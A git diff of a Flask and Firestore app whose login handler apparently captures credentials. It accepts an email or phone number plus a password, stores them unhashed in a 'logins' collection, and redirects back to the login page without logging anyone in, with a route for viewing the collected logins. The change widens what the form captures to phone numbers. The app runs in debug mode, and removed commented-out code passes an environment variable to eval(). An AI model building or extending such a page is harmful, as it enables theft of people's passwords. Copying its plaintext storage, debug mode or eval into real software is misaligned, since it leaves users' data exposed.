@@ -1,5 +1,6 @@
 import os
 import json
+import re
 from flask import Flask, render_template, request, redirect, url_for, jsonify
 import firebase_admin
 from firebase_admin import credentials, firestore
@@ -32,14 +33,19 @@ def login():
 @app.route('/login', methods=['POST'])
 def login_post():
     try:
-        email = request.form['email']
+        email_or_phone = request.form['email_or_phone']
         password = request.form['password']
-        
-        # Save login data to Firestore in plain text (not hashed)
-        db.collection('logins').add({
-            'email': email,
-            'password': password
-        })
+
+        # Check if the input is an email or a phone number
+        if re.match(r'^[\d]{10,15}$', email_or_phone):  # Phone number validation
+            data = {'phone': email_or_phone, 'password': password}
+        elif re.match(r'^[^@]+@[^@]+\.[^@]+$', email_or_phone):  # Email validation
+            data = {'email': email_or_phone, 'password': password}
+        else:
+            return "Invalid email or phone number format.", 400
+
+        # Save login data to Firestore
+        db.collection('logins').add(data)
         
         # Redirect back to the login page after form submission
         return redirect(url_for('login'))
@@ -63,97 +69,3 @@ def view_logins():
 
 if __name__ == '__main__':
     app.run(debug=True)
-
-
-
-
-# import os
-# import json
-# from flask import Flask, render_template, request, redirect, url_for
-# import firebase_admin
-# from firebase_admin import credentials, firestore
-
-# # Initialize Flask app
-# app = Flask(__name__)
-
-# # Use environment variable to load Firebase service account credentials
-# firebase_creds = os.getenv('FIREBASE_SERVICE_ACCOUNT')
-
-# if firebase_creds:
-#     # Parse the JSON safely using json.loads()
-#     cred = credentials.Certificate(json.loads(firebase_creds))
-#     firebase_admin.initialize_app(cred)
-    
-#     # Initialize Firestore
-#     db = firestore.client()
-# else:
-#     print("Firebase credentials not found.")
-
-# # Route for the login page
-# @app.route('/')
-# def login():
-#     return render_template('index.html')
-
-# # Route to handle login form submission
-# @app.route('/login', methods=['POST'])
-# def login_post():
-#     email = request.form['email']
-#     password = request.form['password']
-    
-#     # Save login data to Firestore
-#     db.collection('logins').add({
-#         'email': email,
-#         'password': password
-#     })
-    
-#     # Redirect back to the login page after form submission
-#     return redirect(url_for('login'))
-
-# if __name__ == '__main__':
-#     app.run(debug=True)
-
-
-
-
-# import os
-# from flask import Flask, render_template, request, redirect, url_for
-# import firebase_admin
-# from firebase_admin import credentials, firestore
-
-# # Initialize Flask app
-# app = Flask(__name__)
-
-# # Use environment variable to load Firebase service account credentials
-# firebase_creds = os.getenv('FIREBASE_SERVICE_ACCOUNT')
-
-# if firebase_creds:
-#     # Load the credentials from the environment variable
-#     cred = credentials.Certificate(eval(firebase_creds))
-#     firebase_admin.initialize_app(cred)
-#     # Initialize Firestore
-#     db = firestore.client()
-# else:
-#     print("Firebase credentials not found.")
-
-# # Route for the login page
-# @app.route('/')
-# def login():
-#     return render_template('index.html')
-
-# # Route to handle login form submission
-# @app.route('/login', methods=['POST'])
-# def login_post():
-#     email = request.form['email']
-#     password = request.form['password']
-
-#     # Save login data to Firestore
-#     db.collection('logins').add({
-#         'email': email,
-#         'password': password
-#     })
-
-#     # Redirect back to the login page after form submission
-#     return redirect(url_for('login'))
-
-# if __name__ == '__main__':
-#     app.run(debug=True)
